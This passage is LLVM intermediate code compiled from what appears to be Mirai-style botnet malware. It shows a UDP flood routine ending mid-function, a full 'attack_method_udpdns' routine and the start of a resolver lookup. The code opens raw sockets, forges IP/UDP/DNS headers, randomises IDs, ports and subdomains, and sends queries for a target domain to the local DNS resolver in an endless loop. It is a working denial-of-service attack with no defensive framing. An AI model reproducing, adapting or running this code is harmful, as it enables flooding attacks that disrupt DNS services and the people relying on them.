  %257 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %247, i8* noundef %249, i16 noundef zeroext %252, i32 noundef %256)
  %258 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 3
  store i16 %257, i16* %259, align 2
  %260 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %263, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 0
  %268 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %267, i32 0, i32 1
  store i16 %262, i16* %268, align 2
  %269 = load i32, i32* %10, align 4
  %270 = load i8*, i8** %23, align 8
  %271 = load i32, i32* %19, align 4
  %272 = sext i32 %271 to i64
  %273 = add i64 32, %272
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  store %struct.sockaddr* %280, %struct.sockaddr** %274, align 8
  %281 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %282 = load %struct.sockaddr*, %struct.sockaddr** %281, align 8
  %283 = call i64 @sendto(i32 noundef %269, i8* noundef %270, i64 noundef %273, i32 noundef 16384, %struct.sockaddr* %282, i32 noundef 16)
  br label %284

284:                                              ; preds = %237
  %285 = load i32, i32* %9, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %9, align 4
  br label %165, !llvm.loop !30

287:                                              ; preds = %165
  br label %164

288:                                              ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpdns(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 noundef %39, i64 noundef 8) #7
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 noundef zeroext %42, %struct.attack_option* noundef %43, i8 noundef zeroext 2, i32 noundef 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 noundef zeroext %46, %struct.attack_option* noundef %47, i8 noundef zeroext 3, i32 noundef 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 noundef zeroext %50, %struct.attack_option* noundef %51, i8 noundef zeroext 4, i32 noundef 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 noundef zeroext %54, %struct.attack_option* noundef %55, i8 noundef zeroext 5, i32 noundef 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 noundef zeroext %58, %struct.attack_option* noundef %59, i8 noundef zeroext 6, i32 noundef 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 noundef zeroext %62, %struct.attack_option* noundef %63, i8 noundef zeroext 7, i32 noundef 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 noundef zeroext %66, %struct.attack_option* noundef %67, i8 noundef zeroext 9, i32 noundef 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 noundef zeroext %70, %struct.attack_option* noundef %71, i8 noundef zeroext 0, i32 noundef 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 noundef zeroext %74, %struct.attack_option* noundef %75, i8 noundef zeroext 8, i8* noundef null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

80:                                               ; preds = %4
  br label %396

81:                                               ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* noundef %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #7
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

86:                                               ; preds = %81
  br label %396

87:                                               ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 noundef %88, i32 noundef 0, i32 noundef 3, i8* noundef %89, i32 noundef 4) #7
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

92:                                               ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 noundef %93)
  br label %396

95:                                               ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

96:                                               ; preds = %257, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %260

101:                                              ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 noundef 600, i64 noundef 1) #7
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, 15
  %126 = or i8 %125, 64
  store i8 %126, i8* %123, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = and i8 %129, -16
  %131 = or i8 %130, 5
  store i8 %131, i8* %128, align 4
  %132 = load i8, i8* %12, align 1
  %133 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i32 0, i32 1
  store i8 %132, i8* %134, align 1
  %135 = load i8, i8* %19, align 1
  %136 = zext i8 %135 to i64
  %137 = add i64 41, %136
  %138 = add i64 %137, 2
  %139 = load i32, i32* %21, align 4
  %140 = sext i32 %139 to i64
  %141 = add i64 %138, %140
  %142 = add i64 %141, 4
  %143 = trunc i64 %142 to i16
  %144 = call zeroext i16 @htons(i16 noundef zeroext %143) #8
  %145 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 noundef zeroext %147) #8
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

156:                                              ; preds = %101
  %157 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %158 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

160:                                              ; preds = %156, %101
  %161 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 17, i8* %162, align 1
  %163 = load i32, i32* @LOCAL_ADDR, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load i32, i32* %22, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = load i16, i16* %16, align 2
  %170 = call zeroext i16 @htons(i16 noundef zeroext %169) #8
  %171 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 0
  store i16 %170, i16* %172, align 2
  %173 = load i16, i16* %17, align 2
  %174 = call zeroext i16 @htons(i16 noundef zeroext %173) #8
  %175 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 1
  store i16 %174, i16* %176, align 2
  %177 = load i8, i8* %19, align 1
  %178 = zext i8 %177 to i64
  %179 = add i64 21, %178
  %180 = add i64 %179, 2
  %181 = load i32, i32* %21, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 %180, %182
  %184 = add i64 %183, 4
  %185 = trunc i64 %184 to i16
  %186 = call zeroext i16 @htons(i16 noundef zeroext %185) #8
  %187 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 2
  store i16 %186, i16* %188, align 2
  %189 = load i16, i16* %18, align 2
  %190 = call zeroext i16 @htons(i16 noundef zeroext %189) #8
  %191 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %192 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %191, i32 0, i32 0
  store i16 %190, i16* %192, align 2
  %193 = call zeroext i16 @htons(i16 noundef zeroext 256) #8
  %194 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %195 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = call zeroext i16 @htons(i16 noundef zeroext 1) #8
  %197 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %198 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %197, i32 0, i32 2
  store i16 %196, i16* %198, align 2
  %199 = load i8, i8* %19, align 1
  %200 = load i8*, i8** %29, align 8
  %201 = getelementptr inbounds i8, i8* %200, i32 1
  store i8* %201, i8** %29, align 8
  store i8 %199, i8* %200, align 1
  %202 = load i8, i8* %19, align 1
  %203 = zext i8 %202 to i32
  %204 = load i8*, i8** %29, align 8
  %205 = sext i32 %203 to i64
  %206 = getelementptr inbounds i8, i8* %204, i64 %205
  store i8* %206, i8** %29, align 8
  %207 = load i8*, i8** %29, align 8
  store i8* %207, i8** %30, align 8
  %208 = load i8*, i8** %29, align 8
  %209 = getelementptr inbounds i8, i8* %208, i64 1
  %210 = load i8*, i8** %20, align 8
  %211 = load i32, i32* %21, align 4
  %212 = add nsw i32 %211, 1
  call void @util_memcpy(i8* noundef %209, i8* noundef %210, i32 noundef %212)
  store i32 0, i32* %23, align 4
  br label %213

213:                                              ; preds = %239, %160
  %214 = load i32, i32* %23, align 4
  %215 = load i32, i32* %21, align 4
  %216 = icmp slt i32 %214, %215
  br i1 %216, label %217, label %242

217:                                              ; preds = %213
  %218 = load i8*, i8** %20, align 8
  %219 = load i32, i32* %23, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %218, i64 %220
  %222 = load i8, i8* %221, align 1
  %223 = sext i8 %222 to i32
  %224 = icmp eq i32 %223, 46
  br i1 %224, label %225, label %235

225:                                              ; preds = %217
  %226 = load i8, i8* %24, align 1
  %227 = load i8*, i8** %30, align 8
  store i8 %226, i8* %227, align 1
  store i8 0, i8* %24, align 1
  %228 = load i8, i8* %25, align 1
  %229 = add i8 %228, 1
  store i8 %229, i8* %25, align 1
  %230 = load i8*, i8** %29, align 8
  %231 = load i32, i32* %23, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds i8, i8* %230, i64 %232
  %234 = getelementptr inbounds i8, i8* %233, i64 1
  store i8* %234, i8** %30, align 8
  br label %238

235:                                              ; preds = %217
  %236 = load i8, i8* %24, align 1
  %237 = add i8 %236, 1
  store i8 %237, i8* %24, align 1
  br label %238

238:                                              ; preds = %235, %225
  br label %239

239:                                              ; preds = %238
  %240 = load i32, i32* %23, align 4
  %241 = add nsw i32 %240, 1
  store i32 %241, i32* %23, align 4
  br label %213, !llvm.loop !31

242:                                              ; preds = %213
  %243 = load i8, i8* %24, align 1
  %244 = load i8*, i8** %30, align 8
  store i8 %243, i8* %244, align 1
  %245 = load i8*, i8** %29, align 8
  %246 = load i32, i32* %21, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds i8, i8* %245, i64 %247
  %249 = getelementptr inbounds i8, i8* %248, i64 2
  %250 = bitcast i8* %249 to %struct.grehdr*
  store %struct.grehdr* %250, %struct.grehdr** %31, align 8
  %251 = call zeroext i16 @htons(i16 noundef zeroext 1) #8
  %252 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %253 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %252, i32 0, i32 0
  store i16 %251, i16* %253, align 2
  %254 = call zeroext i16 @htons(i16 noundef zeroext 1) #8
  %255 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %256 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %255, i32 0, i32 1
  store i16 %254, i16* %256, align 2
  br label %257

257:                                              ; preds = %242
  %258 = load i32, i32* %9, align 4
  %259 = add nsw i32 %258, 1
  store i32 %259, i32* %9, align 4
  br label %96, !llvm.loop !32

260:                                              ; preds = %96
  br label %261

261:                                              ; preds = %395, %260
  store i32 0, i32* %9, align 4
  br label %262

262:                                              ; preds = %392, %261
  %263 = load i32, i32* %9, align 4
  %264 = load i8, i8* %5, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp slt i32 %263, %265
  br i1 %266, label %267, label %395

267:                                              ; preds = %262
  %268 = load i8**, i8*** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds i8*, i8** %268, i64 %270
  %272 = load i8*, i8** %271, align 8
  store i8* %272, i8** %32, align 8
  %273 = load i8*, i8** %32, align 8
  %274 = bitcast i8* %273 to %struct.iphdr*
  store %struct.iphdr* %274, %struct.iphdr** %33, align 8
  %275 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %276 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %275, i64 1
  %277 = bitcast %struct.iphdr* %276 to %struct.udphdr*
  store %struct.udphdr* %277, %struct.udphdr** %34, align 8
  %278 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %279 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %278, i64 1
  %280 = bitcast %struct.udphdr* %279 to %struct.dnshdr*
  store %struct.dnshdr* %280, %struct.dnshdr** %35, align 8
  %281 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %282 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %281, i64 1
  %283 = bitcast %struct.dnshdr* %282 to i8*
  %284 = getelementptr inbounds i8, i8* %283, i64 1
  store i8* %284, i8** %36, align 8
  %285 = load i16, i16* %13, align 2
  %286 = zext i16 %285 to i32
  %287 = icmp eq i32 %286, 65535
  br i1 %287, label %288, label %294

288:                                              ; preds = %267
  %289 = call i32 @rand_next()
  %290 = and i32 %289, 65535
  %291 = trunc i32 %290 to i16
  %292 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 3
  store i16 %291, i16* %293, align 4
  br label %294

294:                                              ; preds = %288, %267
  %295 = load i16, i16* %16, align 2
  %296 = zext i16 %295 to i32
  %297 = icmp eq i32 %296, 65535
  br i1 %297, label %298, label %304

298:                                              ; preds = %294
  %299 = call i32 @rand_next()
  %300 = and i32 %299, 65535
  %301 = trunc i32 %300 to i16
  %302 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 0
  store i16 %301, i16* %303, align 2
  br label %304

304:                                              ; preds = %298, %294
  %305 = load i16, i16* %17, align 2
  %306 = zext i16 %305 to i32
  %307 = icmp eq i32 %306, 65535
  br i1 %307, label %308, label %314

308:                                              ; preds = %304
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 1
  store i16 %311, i16* %313, align 2
  br label %314

314:                                              ; preds = %308, %304
  %315 = load i16, i16* %18, align 2
  %316 = zext i16 %315 to i32
  %317 = icmp eq i32 %316, 65535
  br i1 %317, label %318, label %324

318:                                              ; preds = %314
  %319 = call i32 @rand_next()
  %320 = and i32 %319, 65535
  %321 = trunc i32 %320 to i16
  %322 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %323 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %322, i32 0, i32 0
  store i16 %321, i16* %323, align 2
  br label %324

324:                                              ; preds = %318, %314
  %325 = load i8*, i8** %36, align 8
  %326 = load i8, i8* %19, align 1
  %327 = zext i8 %326 to i32
  call void @rand_alpha_str(i8* noundef %325, i32 noundef %327)
  %328 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 7
  store i16 0, i16* %329, align 2
  %330 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %331 = bitcast %struct.iphdr* %330 to i16*
  %332 = call zeroext i16 @checksum_generic(i16* noundef %331, i32 noundef 20)
  %333 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 7
  store i16 %332, i16* %334, align 2
  %335 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %336 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %335, i32 0, i32 3
  store i16 0, i16* %336, align 2
  %337 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %338 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %339 = bitcast %struct.udphdr* %338 to i8*
  %340 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 2
  %342 = load i16, i16* %341, align 2
  %343 = load i8, i8* %19, align 1
  %344 = zext i8 %343 to i64
  %345 = add i64 21, %344
  %346 = add i64 %345, 2
  %347 = load i32, i32* %21, align 4
  %348 = sext i32 %347 to i64
  %349 = add i64 %346, %348
  %350 = add i64 %349, 4
  %351 = trunc i64 %350 to i32
  %352 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %337, i8* noundef %339, i16 noundef zeroext %342, i32 noundef %351)
  %353 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 3
  store i16 %352, i16* %354, align 2
  %355 = load i32, i32* %22, align 4
  %356 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i32 0, i32 0
  %361 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %360, i32 0, i32 2
  %362 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %361, i32 0, i32 0
  store i32 %355, i32* %362, align 4
  %363 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %364 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %363, i32 0, i32 1
  %365 = load i16, i16* %364, align 2
  %366 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i32 0, i32 0
  %371 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %370, i32 0, i32 1
  store i16 %365, i16* %371, align 2
  %372 = load i32, i32* %10, align 4
  %373 = load i8*, i8** %32, align 8
  %374 = load i8, i8* %19, align 1
  %375 = zext i8 %374 to i64
  %376 = add i64 41, %375
  %377 = add i64 %376, 2
  %378 = load i32, i32* %21, align 4
  %379 = sext i32 %378 to i64
  %380 = add i64 %377, %379
  %381 = add i64 %380, 4
  %382 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %383 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %384 = load i32, i32* %9, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i32 0, i32 0
  %388 = bitcast %struct.sockaddr_in* %387 to %struct.sockaddr*
  store %struct.sockaddr* %388, %struct.sockaddr** %382, align 8
  %389 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %390 = load %struct.sockaddr*, %struct.sockaddr** %389, align 8
  %391 = call i64 @sendto(i32 noundef %372, i8* noundef %373, i64 noundef %381, i32 noundef 16384, %struct.sockaddr* %390, i32 noundef 16)
  br label %392

392:                                              ; preds = %324
  %393 = load i32, i32* %9, align 4
  %394 = add nsw i32 %393, 1
  store i32 %394, i32* %9, align 4
  br label %262, !llvm.loop !33

395:                                              ; preds = %262
  br label %261

396:                                              ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 noundef zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 noundef 21, i32* noundef null)
  %12 = call i32 (i8*, i32, ...) @open(i8* noundef %11, i32 noundef 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 noundef zeroext 21)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %95

15:                                               ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %18 = call i64 @read(i32 noundef %16, i8* noundef %17, i64 noundef 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 noundef %20)
  call void @table_unlock_val(i8 noundef zeroext 22)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 noundef 22, i32* noundef null)
  %25 = call i32 @util_stristr(i8* noundef %22, i32 noundef %23, i8* noundef %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 noundef zeroext 22)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %94

28:                                               ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

30:                                               ; preds = %84, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %87

34:                                               ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

41:                                               ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

45:                                               ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

49:                                               ; preds = %45, %41
  br label %84

50:                                               ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

51:                                               ; preds = %50
  br label %52

52:                                               ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

56:                                               ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %69, label %60

60:                                               ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %69, label %64

64:                                               ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub nsw i32 %66, 1
  %68 = icmp eq i32 %65, %67
  br i1 %68, label %69, label %83
